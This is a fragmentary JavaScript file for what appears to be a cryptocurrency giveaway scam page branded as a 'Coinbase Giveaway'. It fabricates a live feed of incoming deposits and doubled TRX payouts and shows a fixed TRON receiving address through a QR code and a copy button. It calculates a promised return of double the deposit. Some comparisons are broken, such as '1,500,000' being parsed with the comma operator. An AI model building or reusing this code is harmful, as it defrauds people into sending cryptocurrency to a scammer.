...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">TKmKoSwwpzNjDw4gsHktW2qaUpJKBZqyDe</span> </td> <td>' +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">TKmKoSwwpzNjDw4gsHktW2qaUpJKBZqyDe</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    "</a> </td> <td>" +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">4' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">TKmKoSwwpzNjDw4gsHktW2qaUpJKBZqyDe</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        "</a> </td> <td>" +
        send_amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",") +
        ' TRX</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 1000 && $('#cal-in').val() <= 15000000) {
      ...
      $("#qrcode_svg").attr(
        "src",
        "https://api.qrserver.com/v1/create-qr-code/?data=TKmKoSwwpzNjDw4gsHktW2qaUpJKBZqyDe&size=150x150"
      );
      // $('#paynow')
      //   .parent()
      //   .attr(
      //     'href',
      //     'tron:TKmKoSwwpzNjDw4gsHktW2qaUpJKBZqyDe?amount=' +
      //       amount_entered +
      //       '&message=Deposit+to+Coinbase+Giveaway+' +
      //       tm,
      //   )
    } else $('#warn').text('Amount should be within 1,000 TRX to 1,5000,000 TRX')
  }),
  $('#close').click(() => {
  ...
  $('#cal-in').on('input', () => {
    ...
    if (in_amount >= 100 && in_amount < 50000) {
      $('#cal-out').val(in_amount * 2)
    } else if ((in_amount) >= 45000 && in_amount <= 1,500,000) {
...
$('#cal-out').on('input', () => {
  ...
  } else if (in_amount <= 50000 && in_amount <= 1,500,000) {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'TKmKoSwwpzNjDw4gsHktW2qaUpJKBZqyDe',
  )
